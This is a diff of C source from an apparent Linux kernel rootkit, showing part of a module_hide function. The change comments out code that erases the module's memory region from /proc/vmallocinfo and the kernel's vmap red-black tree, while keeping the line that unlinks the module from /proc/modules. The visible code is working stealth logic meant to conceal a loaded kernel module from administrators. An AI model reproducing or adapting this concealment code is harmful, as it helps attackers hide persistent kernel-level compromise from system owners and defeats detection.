@@ -196,7 +196,7 @@ void module_hide(void) {
     sect_attrs_bkp = THIS_MODULE->sect_attrs;
     notes_attrs_bkp = THIS_MODULE->notes_attrs;
 
-    struct vmap_area *va, *vtmp;
+    // struct vmap_area *va, *vtmp;
     // struct module_use *use, *tmp;
     struct list_head *_vmap_area_list;
     struct rb_root *_vmap_area_root;
@@ -222,17 +222,17 @@ void module_hide(void) {
 	pr_info("[+] vmap noobs not found");
 	return;
    }
-
-    /* hidden from /proc/vmallocinfo */
+    /*
+    // hidden from /proc/vmallocinfo 
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
         if ((unsigned long) THIS_MODULE > va->va_start &&
             (unsigned long) THIS_MODULE < va->va_end) {
             list_del(&va->list);
-            /* remove from red-black tree */
+            // remove from red-black tree 
             rb_erase(&va->rb_node, _vmap_area_root);
         }
     }
-
+    */
     // Remove from /proc/modules
     list_del(&THIS_MODULE->list);
     // list_del_init(&THIS_MODULE->list);
